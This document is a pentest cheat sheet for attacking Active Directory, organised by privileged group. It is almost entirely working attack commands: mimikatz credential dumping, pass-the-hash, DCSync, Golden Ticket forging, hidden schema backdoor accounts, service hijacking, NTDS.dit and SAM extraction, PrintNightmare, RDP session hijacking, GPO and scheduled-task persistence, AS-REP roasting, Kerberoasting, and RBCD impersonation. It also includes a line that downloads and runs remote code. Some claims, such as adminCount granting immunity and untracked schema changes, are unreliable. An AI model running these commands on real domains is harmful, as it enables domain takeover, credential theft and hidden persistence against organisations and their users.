# LDAP and Kerberos
LDAP and Kerberos Legend:

    CN = Common Name
    OU = Organisation Name
    SN = Surname
    GN = Given Name
    O = Organisation
    DC = Domain Component
    DIT = Directory Information Tree
    DN = Distinguished Name
    RDN = Relative Distinguished Name
    SPN = Service Principale Name
    TGT = Ticket Granting Ticket
    ST = Service Ticket
    KDC = Key Distribution Center
    AS = Authorization Service
    TGS = Ticket Granting Service
    AS-REP = Authorization Service Reply
    GPO = Group Policy Object

## Interesting Active Directory groups
### CN=Domain Admins
    - full control over the domain: create, modify and delete user accounts, policies and systems
    - manage Group Policy Objects

Use mimikatz to dump credentials from memory:

    sekurlsa::logonpasswords

Extract NTLM hashes and use Pass-the-Hash:

    sekurlsa::pth /user:admin /domain:example.com /ntlm:<hash>

Extract TGT:

    sekurlsa::tickets /export

If an account in `Domain Admins` is compromised, use DCSync to extract all NTLM hashes:

    lsadump::dcsync /domain:example.com /user:krbtgt

### CN=Enterprise Admins
    - controls all domains in a multi-domain forest
    - higher privilege than domain Admins
    - can create new domains and modify schema settings

If you compromise an Enterprise Admin, you can controll all child domains in the forest.
Create a new domain admin in the current domain:

    net user pentester P4ssw0rd! /add /domain
    net group "Domain Admins" pentester /add /domain

Create a new domain admin in a specified domain:

    net user pentester P4ssw0rd! /add /domain
    net group "Domain Admins" pentester /add /domain /domain:example.com

Alternatively, PowerShell can be used to specify a target domain:

    Add-ADGroupMember -Identity "Domain Admins" -Members pentester -Server dc.example.com


Extract the `krbtgt` hash:

    mimikatz "lsadump::dcsync /domain:example.com /user:krbtgt"

Forge a `Golden Ticket`:

    kerberos::golden /user:pentester /domain:example.com /sid:<domain_SID> /krbtgt:<hash>


### CN=Schema Admins
    - can modify active directory schema: new attributes and object classes

#### Create backdoor user
1. Create a new object class for backdoor accounts that normal tools won't recognize as users:

    New-ADObject -Name "StealthyUserClass" -Type classSchema -Path "CN=Schema,CN=Configuration,DC=example,DC=com"

2. Ass a new user account with this class

    New-ADObject -Name "pentest_backdoor" -Type StealthyUserClass -Path "CN=Users,DC=example,DC=com"
    Set-ADUser -Identity "pentest_backdoor" -PasswordNeverExpires $true -CannotChangePassword $true

#### Modify schema to store hidden passwords
Create a new attribute for hidden passwords

    New-ADObject -Name "HiddenPassword" -Type attributeSchema -Path "CN=Schema,CN=Configuration,DC=example,DC=com"

Assign the hidden attribute to admin accounts

    Set-ADUser -Identity "Administrator" -Replace @{HiddenPassword="SuperSecret123!"}

Extract the hidden password later

    Get-ADUser -Identity "Administrator" -Properties HiddenPassword

--> AD logs won't track this change

#### Add privileges to a user without adding them to groups
Modify the adminCount attribute to make a normal user inherit admin privileges:

    Set-ADUser -Identity "normaluser" -Replace @{adminCount=1}

This makes `normaluser` immune to security restrictions

Backdoor object permissions using DACLs

    dsacls "CN=Domain Admins,CN=Users,DC=example,DC=com" /G lowprivuser:F

#### Add a fake service account with unusual privileges
This approach creates a hidden service account that has admin rights but doesn't appear in common queries.
Create a new `StealthyServiceAccount` Class:

    New-ADObject -Name "StealthyServiceAccount" -Type classSchema -Path "CN=Schema,CN=Configuration,DC=example,DC=com"

Create a new service account using this class:

    New-ADObject -Name "backdoor_svc" -Type StealthyServiceAccount -Path "CN=Users,DC=example,DC=com"
    Set-ADUser -Identity "backdoor_svc" -Replace @{servicePrincipalName="MSSQLSvc/hidden"}


### CN=Administrators
    - administrative privilages on domain controllers and member servers
    - often contains domain admins and enterprise admins as nested members

Dump credentials using mimikatz:

    privilege::debug" "sekurlsa::logonpasswords

Modify a system service to execute a malicious payload:

    sc config Spooler binPath= "cmd.exe /c net user pentester P4ssw0rd! /add"


### CN=Server Operators
    - can log into domain controllers, start/stop services and manage shared resources

Server Operators can restart services, which allow PE:

    sc stop Spooler
    sc config Spooler binPath= "cmd.exe /c net localgroup Administrators pentester /add"
    sc start Spooler

DLL Hijacking

### CN=Backup Operators
    - can bypass file permissions to back up and restore any file
    - can log into domain controllers in some environments

Bypass ACLs and read the NTDS.dit file, which contains all NTLM hashes:

    vssadmin create shadow /for=C:
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\

Extract SYSTEM registry hive that contains local credentials:

    reg save hklm\sam C:\Temp\sam
    reg save hklm\security C:\Temp\security
    reg save hklm\system C:\Temp\system


### CN=Print Operators
    - can log into domain controllers, even though they are not admins
    - can install print drivers, which may be exploited for PE 

Use mimikatz to exploit the PrintNightmare vulnerability CVE-2021-1675:

    mimikatz "privilege::debug" "misc::printnightmare /exploit"


### CN=Remote Desktop Users
    - members can log in remotely to systems via RDP

#### Hijack RDP Sessions
List active RDP sessions:

    qwinsta /server:target

Hijack a session:

    tscon <session_id> /dest:console

#### Brute force RDP logins
Use crackmapexec to find RDP credentials:

    crackmapexec smb target.com -u users.txt -p passwords.txt --rdp


### CN=Account Operators
    - can create, modify and delete user accounts(except for Admins)
    - can reset passwords

Create a new Domain Admin:
    net user pentester P4ssw0rd! /add /domain
    net group "Domain Admins" pentester /add /domain

Reset password of existing domain admin:
    net user admin NewPass123! /domain


### CN=Group Policy Creator Owners
    - can modify GPOs
    - can execute arbitary code across all domain machines via startup scripts

#### Modify group policies to execute code
Add a malicious startup script:

    echo "net localgroup Administrators pentester /add" >> \\domain.com\sysvol\domain.com\Policies\{GPO_GUID}\Machine\Scripts\Startup\script.bat

#### Abuse schudeled tasks via GPO
Create a scheduled task to execute malware:

    schtasks /create /tn "MalwareTask" /tr "C:\malware.exe" /sc onlogon /ru SYSTEM


## Enumeration
Basic enumeration of contents:

    ldapsearch -h [DC_IP] -p [PORT] -x -b "dc=[DOMAIN],dc=[TLD]"

`-x` for anonmyous bind and `-b` specifies the domains

Enumerate domain structure:

    ldapsearch -x -h [DC_IP] -D "CN=user,CN=Users,DC=example,DC=com" -W -b "DC=example,DC=com"

using `windapsearch.py`:

    windapsearch.py -d domain.tld --dc-ip [DC_IP] --custom "objectClass=*"

this command dumps an enormous content of the active directory

user enumeration:

    windapsearch.py -d domain.tld --dc-ip [DC_IP] -U

## AS-REP roasting
In Kerberos `Pre-authentication` is an important securtiy feature to prevent replay attacks and password brute force. However for some accounts pre-authentication may be disabled. This weakness can be exploited with as-rep roasting. Kerberos sends a response including encrypted information that can be used for offline cracking. If pre-authentication is enabled Kerberos sends a chellange to the user which has to be send back encrypted using the users password. This step is skipped when pre-authentication is disabled.

GetNPusers.py can be used to request such a response for a such a user:

    GetNPUsers.py domain.tld/username -dc-ip [DC_IP] -no-pass

The received hash can be passed to john for offline cracking:

    john hash --fork=4 --wordlist=/usr/share/wordlists/rockyou.txt


## Privilege Escalation
### Active shell connection
Collect ldap user information:

    whoami /all
    whoami /groups
    net user [USERNAME] /domain
    net group "Domain Admins" /domain

#### If powershell is present
Basic directory information:

    Get-ADDomain
    Get-ADUser -Identity $env:USERNAME -Properties *
    Get-ADGroup -Filter * | Select Name
    Get-ADGroupMember "Domain Admins"

Check if current user can modify interesting attributes to escalate privileges:

    (Get-ACL "LDAP://CN=Users,DC=example,DC=com").Access

Check if current user has admin privileges

    Get-ADUser -Filter {adminCount -eq 1} -Properties adminCount

Abuse MachineAccountQuota

    New-ADComputer -Name "FakePC1" -SAMAccountName "FakePC1$" -InstancePath "OU=Computers,DC=example,DC=com"

### Abuse user privileges
Check for accounts that have `TRUSTED_FOR_DELEGATION` enabled:

    Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

#### GenericAll
GenericAll privilege can be abused for resource based constraint delegation attack (RBCD).
Through RBCD an attacker can add a computer under his control to the domain.

Check if the value of `ms-ds-machineaccountquota` is higher than zero in order to add an account:

    Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

Verify that a user can a act on behalf of the domain admin:

    upload PowerView.ps1
    Bypass-4MSI
    ./PowerView.ps1
    Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity

If the attribute value is empty the RBCD attack can be started.
Use powermad to add a computer object

    upload Powermad.ps1
    ./Powermad.ps1
    New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

Verify the added computer object:

    Get-ADComputer -identity FAKE-COMP01

Configure RBCD:

    Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$

Verification:

    Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
    Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity

As the `ms-allowedtoactonbehalfofotheridentity` value type is `Raw Security Descriptor` it has to be converted to a string for further investigation:

    $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

Copy the bytes to the `Raw Security Descriptor`:

    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0

Print the Access Control List specified by the Security Descriptor:

    $Descriptor
    $Descriptor.DiscretionaryAcl

The `SecurityIdentifier` should now be set to the SID of the `FAKE-COMP01`.

Now we can perform an S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the administrator.
At first extract the hash of the password `rc4_hamac` valuethat was used to create the computer object:

    .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:<DOMAIN>

Next generate a Kerberos ticket for the Administrator:

    rubeus.exe s4u /user:FAKE-COMP01$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:<DOMAIN> /ptt

Before pasting the value to the file make sure to remove any whitespace characters from the value.
Next create a new file with the base64 decoded value of the ticket:

    base64 -d ticket.kirbi.b64 > ticket.kirbi

Use impackets ticket converter to format the ticket correctly:

    ticketConverter.py ticket.kirbi ticket.ccache

Now connect as `Administrator` to the domain by passing the hash:

    KRB5CCNAME=ticket.ccache psexec.py <DOMAIN>/administrator@<DOMAIN> -k -no-pass

#### WriteDacl
WriteDacl privileges gives a user the ability to add ACLs to an object. This means that an attacker can add a user to this group and give them DCSync privileges. `DCSync` privilages give a user the ability to act as a domain admin.

Upload PowerView:

    upload PowerView.ps1
    Bypass-4MSI
    ./PowerView.ps1

Create new domain user and add them to groups is necessary:

    net user pentester P4ssw0rd! /add /domain

Use the `Add-ObjectACL` module to equip the the user with `DCSync` rights:

    $pass = convertto-securestring 'P4ssw0rd!' -asplain -force
    $cred = new-object system.management.automation.pscredential('<DOMAIN>\pentester', $pass)
    Add-ObjectACL -PrincipalIdentity pentester -Credential $cred -Rights DCSync

Now use `secretsdump.py` from the Impacket suite to reveal the NTLM hashes for all domain users:

    secretsdump.py <DOMAIN>/pentester@<DOMAIN_IP>

The obtained Domain Admin hash can be used to login via `psexec`:

    psexec.py administrator@<DOMAIN_IP> -hashes <HASH>


### Bloodhound
Bloodhound is a versatile tool to represent active directories in a graphical way.
Before analyzing data in Bloodhound SharpHound.exe can be used to collect the necessary data.
If evil-winrm is active:

    upload SharpHound.exe
    ./SharpHound.exe
    download <id>_BloodHound.zip

If classic reverse shell is active:

    iex(new-object net.webclient).downloadstring('<LINK>')

Now upload this zip file into the bloodhound application.

### Kerberoasting
If servicePrincipalName (SPN) is set on an account a Kerberos ticket can be requested and used for offline cracking.
This indicates a user can request a ST from the KDC in order to access a service. This ticket is encrypted using the users password therefore this information can be used for offline cracking.

Check for kerberoastable Accounts:

    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

Set an SPN and perform Kerberoasting

    Set-ADComputer -Identity "FakePC1$" -ServicePrincipalNames @{Add="FakePC1/Service"}

Request TGS Hashes for offline Cracking:

    Rubeus.exe kerberoast /format:hashcat

Crack the hash with:

    hashcat -m 13100 hash.txt rockyou.txt